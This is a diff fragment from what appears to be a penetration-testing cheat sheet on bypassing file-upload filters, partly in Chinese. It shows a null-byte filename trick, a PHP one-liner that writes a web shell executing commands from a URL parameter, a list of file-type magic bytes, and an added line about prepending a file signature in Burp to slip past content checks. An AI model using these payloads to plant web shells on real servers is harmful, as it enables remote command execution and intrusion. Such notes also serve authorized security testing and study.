@@ -14,6 +14,7 @@ filename.php%00.pdf
 <?php fputs(fopen('shell.php','w'),'<?php eval($_GET[cmd])?>');?>
 ```
 ### 文件类型特征码（Convert to ascii in burp）
+Put the corresponding file signature code in front of the file content in burp 
 ```
 JPEG (jpg)，文件头：FFD8FF
 PNG (png)，文件头：89504E47
